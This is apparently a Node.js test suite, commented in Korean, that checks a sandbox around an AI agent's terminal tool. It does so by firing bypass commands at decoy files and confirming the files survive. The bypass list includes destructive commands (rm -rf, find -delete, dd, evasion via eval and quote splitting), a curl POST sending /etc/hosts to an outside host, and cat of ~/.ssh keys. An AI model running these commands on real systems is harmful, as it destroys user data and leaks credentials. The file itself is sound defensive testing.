// P6-T1 · 적대적 검증 — **"막혔다고 말했는가"가 아니라 "미끼가 살아있는가"를 본다.**
//
// 어제의 실패에서 배운 것: 게이트가 `blocked === true` 만 보다가 파일이 없어서 막힌 것(ENOENT)까지
// "보호가 작동함"으로 셌다. 메시지는 거짓말을 할 수 있지만 **파일시스템은 거짓말을 못 한다.**
//
// 그래서 여기서는 도구가 뭐라고 답했는지 보지 않는다. 미끼를 심고, 우회를 던지고,
// 미끼가 그대로인지만 확인한다. 목록으로 막는 설계였다면 아래 절반은 뚫린다.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtemp, writeFile, mkdir, readFile, readdir } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { runCommand } from '../src/runtime/terminal-run.js';
import { makeLocalTerminalTool } from '../src/runtime/local-terminal.js';
import { sandboxAvailable } from '../src/runtime/sandbox.js';

const 원본 = '건드리면 안 되는 내용';

async function 미끼밭() {
  const dir = await mkdtemp(join(tmpdir(), 'gpao-t5-미끼-'));
  await mkdir(join(dir, '하위'), { recursive: true });
  for (const p of ['중요.md', '하위/깊은.md', '설정.json']) await writeFile(join(dir, p), 원본);
  return dir;
}

async function 그대로인가(dir) {
  const missing = [];
  for (const p of ['중요.md', '하위/깊은.md', '설정.json']) {
    try {
      if ((await readFile(join(dir, p), 'utf8')) !== 원본) missing.push(`${p}(내용 바뀜)`);
    } catch { missing.push(`${p}(사라짐)`); }
  }
  return missing;
}

// **우회 목록은 계속 늘린다.** 하나 추가할 때마다 "목록으로 막는 설계였다면 여기서 뚫렸다"가 는다.
const 우회들 = [
  ['정면 삭제',            (d) => `rm -f ${d}/중요.md`],
  ['재귀 삭제',            (d) => `rm -rf ${d}`],
  ['find 삭제',            (d) => `find ${d} -name '*.md' -delete`],
  ['find exec 삭제',       (d) => `find ${d} -name '*.md' -exec rm {} \;`],
  ['python 삭제',          (d) => `python3 -c "import os; os.remove('${d}/중요.md')"`],
  ['python rmtree',        (d) => `python3 -c "import shutil; shutil.rmtree('${d}')"`],
  ['리다이렉션 덮어쓰기',  (d) => `echo 오염 > ${d}/중요.md`],
  ['이어쓰기',             (d) => `echo 오염 >> ${d}/중요.md`],
  ['tee 덮어쓰기',         (d) => `echo 오염 | tee ${d}/중요.md`],
  ['sed 제자리 수정',      (d) => `sed -i '' 's/내용/오염/' ${d}/중요.md`],
  ['cp 로 덮어쓰기',       (d) => `cp /etc/hosts ${d}/중요.md`],
  ['mv 로 치우기',         (d) => `mv ${d}/중요.md /tmp/가져감.md`],
  ['truncate',             (d) => `: > ${d}/중요.md`],
  ['dd',                   (d) => `dd if=/dev/zero of=${d}/중요.md bs=1 count=1`],
  ['chmod',                (d) => `chmod 000 ${d}/중요.md && echo 오염 > ${d}/중요.md`],
  ['서브셸 안에서',        (d) => `(cd ${d} && rm -f 중요.md)`],
  ['백틱 실행',            (d) => `eval \`echo rm -f ${d}/중요.md\``],
  ['변수 우회',            (d) => `T=${d}/중요.md; rm -f "$T"`],
  ['따옴표 쪼개기',        (d) => `r""m -f ${d}/중요.md`],
  ['xargs',                (d) => `echo ${d}/중요.md | xargs rm -f`],
  ['perl',                 (d) => `perl -e 'unlink("${d}/중요.md")'`],
  ['node',                 (d) => `node -e "require('fs').rmSync('${d}/중요.md')"`],
  ['ruby',                 (d) => `ruby -e 'File.delete("${d}/중요.md")' 2>/dev/null || true`],
  ['osascript',            (d) => `osascript -e 'do shell script "rm -f ${d}/중요.md"'`],
  ['&& 뒤에 숨기기',       (d) => `echo 안녕 && rm -f ${d}/중요.md`],
  ['; 뒤에 숨기기',        (d) => `echo 안녕; rm -f ${d}/중요.md`],
  ['|| 뒤에 숨기기',       (d) => `false || rm -f ${d}/중요.md`],
  ['$() 안에서',           (d) => `echo $(rm -f ${d}/중요.md)`],
  ['백그라운드로',         (d) => `rm -f ${d}/중요.md & wait`],
  ['스크립트 만들어 실행', (d) => `echo 'rm -f ${d}/중요.md' > /tmp/x.sh && sh /tmp/x.sh`],
];

test('미끼밭: 어떤 우회로도 파일이 사라지거나 바뀌지 않는다', { skip: !sandboxAvailable() && '이 컴퓨터는 샌드박스 없음' }, async () => {
  // 각 우회는 자기 미끼밭에서 돈다(서로 간섭 없음) → 나란히 돌린다.
  // 순차로 돌리면 우회를 늘릴수록 게이트가 느려져서, 검사를 늘리기 싫어진다.
  const 결과 = await Promise.all(우회들.map(async ([이름, 만들기]) => {
    const dir = await 미끼밭();
    await runCommand(만들기(dir), { cwd: dir, timeoutMs: 15_000 });
    const 피해 = await 그대로인가(dir);
    return 피해.length ? `${이름} → ${피해.join(', ')}` : null;
  }));
  const 뚫린것 = 결과.filter(Boolean);
  assert.deepEqual(뚫린것, [], `우회 ${뚫린것.length}건이 뚫렸다:\n  ${뚫린것.join('\n  ')}`);
});

test('새 파일도 못 만든다(변경은 없는 것을 만드는 것도 포함이다)', { skip: !sandboxAvailable() && '샌드박스 없음' }, async () => {
  const dir = await 미끼밭();
  await runCommand(`touch ${dir}/새파일.txt && mkdir ${dir}/새폴더`, { cwd: dir });
  const 목록 = await readdir(dir);
  assert.ok(!목록.includes('새파일.txt'), '새 파일이 생겼다');
  assert.ok(!목록.includes('새폴더'), '새 폴더가 생겼다');
});

test('네트워크로 내보내지 못한다(유출은 삭제보다 되돌리기 어렵다)', { skip: !sandboxAvailable() && '샌드박스 없음' }, async () => {
  const r = await runCommand('curl -s -m 8 -X POST -d "@/etc/hosts" https://example.com', { timeoutMs: 15_000 });
  assert.notEqual(r.exitCode, 0, '네트워크가 열려 있다 — 파일을 밖으로 보낼 수 있다');
});

test('비밀 자리는 읽지도 못한다(승인과 무관하게)', { skip: !sandboxAvailable() && '샌드박스 없음' }, async () => {
  for (const mode of ['probe', 'granted']) {
    const r = await runCommand('cat ~/.ssh/* 2>&1 | head -5', { mode, timeoutMs: 10_000 });
    assert.doesNotMatch(r.stdout, /PRIVATE KEY|ssh-rsa|ssh-ed25519/,
      `${mode}: 개인키가 읽혔다 — 승인해도 비밀은 안 새야 한다`);
  }
});

test('토큰이 든 환경변수는 자식에게 안 넘어간다', async () => {
  const r = await runCommand('echo "[$PLAIN_VAR][$MY_API_KEY]"', {
    env: { ...process.env, PLAIN_VAR: '안전값', MY_API_KEY: 'sk-절대노출금지' },
  });
  assert.match(r.stdout, /\[안전값\]/, '평범한 변수까지 막으면 명령이 안 돈다');
  assert.doesNotMatch(r.stdout, /sk-절대노출금지/, 'API 키가 자식 프로세스로 새어 나갔다');
});

// ── 막기만 하면 도구가 아니다 ────────────────────────────────────────────
test('읽기·확인 명령은 그대로 통과한다', { skip: !sandboxAvailable() && '샌드박스 없음' }, async () => {
  const dir = await 미끼밭();
  for (const cmd of [
    'pwd', 'ls -la', 'cat 중요.md', 'find . -name "*.md" | wc -l',
    'grep -r 내용 . | head -3', 'du -sh .', 'echo $((1+1))',
  ]) {
    const r = await runCommand(cmd, { cwd: dir, timeoutMs: 15_000 });
    assert.equal(r.exitCode, 0, `읽기 명령이 막혔다: ${cmd}\n${r.stderr}`);
  }
});

// ── 셸 관용구를 쓴다는 이유로 등급이 오르지 않는다 ──────────────────────
//
// 라이브 실측(2026-07-27): 사용자가 "작업용SSD"라고만 답한 턴에서 모델이
// `python3 - <<'PY' … os.walk … PY` 로 폴더를 **읽으려** 했는데 승인 카드가 떴다.
// zsh 가 heredoc 을 위해 임시 파일을 만들고 그게 `deny file-write*` 에 막혔기 때문이다.
// 읽기 하나를 못 해서 흐름이 통째로 멈췄다 — 안전과 무관한 자리에서 능력을 잃은 것이다.
//
// **판정 기준은 관용구가 아니라 결과다: 사용자의 자리를 바꿨는가.**
// 그래서 "heredoc 은 허용"이라는 목록을 만들지 않는다. 아래 두 검사는 한 쌍이다 —
// 같은 관용구라도 바꾸려 들면 여전히 막혀야 한다. 목록이었다면 두 번째가 뚫린다.
const 셸관용구 = [
  ['heredoc',        (d) => `python3 - <<'PY'\nimport os\nprint(len(os.listdir('${d}')))\nPY`],
  ['heredoc(cat)',   (d) => `cat <<'EOF'\n${d}\nEOF`],
  ['here-string',    (d) => `wc -c <<< "$(ls ${d})"`],
  ['heredoc(sh)',    (d) => `sh <<'SH'\nls ${d}\nSH`],
];

test('읽기만 하는 명령은 셸 관용구를 써도 승인으로 올라가지 않는다', { skip: !sandboxAvailable() && '샌드박스 없음' }, async () => {
  const tool = makeLocalTerminalTool();
  const 잘못판정 = [];
  const 피해난것 = [];
  for (const [이름, 만들기] of 셸관용구) {
    const dir = await 미끼밭();
    const r = await tool.probe(만들기(dir), { cwd: dir, timeoutMs: 15_000 });
    if (r.changes !== false) 잘못판정.push(`${이름} → changes=${r.changes} (${r.probe?.stderr?.trim() ?? ''})`);
    const 피해 = await 그대로인가(dir);
    if (피해.length) 피해난것.push(`${이름} → ${피해.join(', ')}`);
  }
  assert.deepEqual(피해난것, [], '읽기 명령이 미끼를 건드렸다');
  assert.deepEqual(잘못판정, [],
    `읽기만 하는데 "바꾼다"로 판정됐다 — 사용자는 읽기 하나에 승인을 눌러야 한다:\n  ${잘못판정.join('\n  ')}`);
});

test('같은 관용구라도 격리 밖 실물은 바꾸지 못한다', { skip: !sandboxAvailable() && '샌드박스 없음' }, async () => {
  const tool = makeLocalTerminalTool();
  const 샌것 = [];
  const 피해난것 = [];
  const 바꾸는것 = [
    ['heredoc 으로 삭제',   (d) => `python3 - <<'PY'\nimport os\nos.remove('${d}/중요.md')\nPY`],
    ['heredoc 으로 덮어쓰기', (d) => `cat <<'EOF' > ${d}/중요.md\n오염\nEOF`],
    ['here-string 로 덮어쓰기', (d) => `cat > ${d}/중요.md <<< 오염`],
    ['heredoc 안에서 rm',   (d) => `sh <<'SH'\nrm -f ${d}/중요.md\nSH`],
  ];
  for (const [이름, 만들기] of 바꾸는것) {
    const dir = await 미끼밭();
    const r = await tool.probe(만들기(dir), { cwd: dir, timeoutMs: 15_000 });
    if (r.sandboxEnforcement?.state !== 'enforced') 샌것.push(`${이름} → enforcement=${r.sandboxEnforcement?.state}`);
    const 피해 = await 그대로인가(dir);
    if (피해.length) 피해난것.push(`${이름} → ${피해.join(', ')}`);
  }
  assert.deepEqual(피해난것, [], '임시 자리를 열어 준 것이 미끼밭까지 열었다');
  assert.deepEqual(샌것, [],
    `격리 적용 사실이 없다:\n  ${샌것.join('\n  ')}`);
});

test('임시 자리는 이번 실행에만 있고 끝나면 남지 않는다', { skip: !sandboxAvailable() && '샌드박스 없음' }, async () => {
  // 임시 자리에 쓴 것이 남으면 "아무것도 안 바꿨다"는 증명이 거짓이 된다.
  // `;` 로 이으면 마지막 명령의 코드만 남아 **쓰기 실패가 묻힌다**(이 검사가 실제로 그랬다 —
  // 임시 자리를 빼고 돌렸는데도 초록이었다). `&&` 로 이어야 실패가 그대로 올라온다.
  const r = await runCommand('echo $TMPDIR && echo 남는가 > "$TMPDIR/흔적.txt" && cat "$TMPDIR/흔적.txt"', { mode: 'probe' });
  assert.equal(r.exitCode, 0, `임시 자리에 쓰지 못했다:\n${r.stderr}`);
  assert.match(r.stdout, /남는가/, '썼다고 했는데 읽히지 않는다');
  const 자리 = r.stdout.split('\n')[0].trim();
  assert.ok(자리 && 자리 !== tmpdir(), `probe 가 공용 임시 자리를 그대로 썼다: ${자리}`);
  await assert.rejects(() => readdir(자리), '실행이 끝났는데 임시 자리가 남아 있다');
});

test('안 끝나는 명령은 시간에 걸려 끝나고, 그 사실을 남긴다', async () => {
  const r = await runCommand('sleep 30', { timeoutMs: 400 });
  assert.equal(r.stopped, 'timeout', '왜 끝났는지 안 남기면 "실패했다"와 구분이 안 된다');
  assert.ok(r.durationMs < 5000, `제때 안 끊겼다(${r.durationMs}ms)`);
});

test('입력을 기다리는 명령에 갇히지 않는다', async () => {
  const r = await runCommand('read -r 답', { timeoutMs: 2500 });
  assert.notEqual(r.stopped, 'timeout', 'stdin 이 열려 있어 프롬프트에서 멈췄다');
});

test('출력이 길면 가운데를 접고 접었다고 말한다', async () => {
  const r = await runCommand('seq 1 120000');
  assert.equal(r.truncated, true);
  assert.match(r.stdout, /가운데 \d+자 생략/, '조용히 자르면 모델이 "이게 전부"로 읽는다');
  assert.match(r.stdout, /^1\n/, '앞을 남겨야 무슨 일이 시작됐는지 안다');
  assert.match(r.stdout, /120000\n?$/, '뒤를 남겨야 어떻게 끝났는지 안다');
});
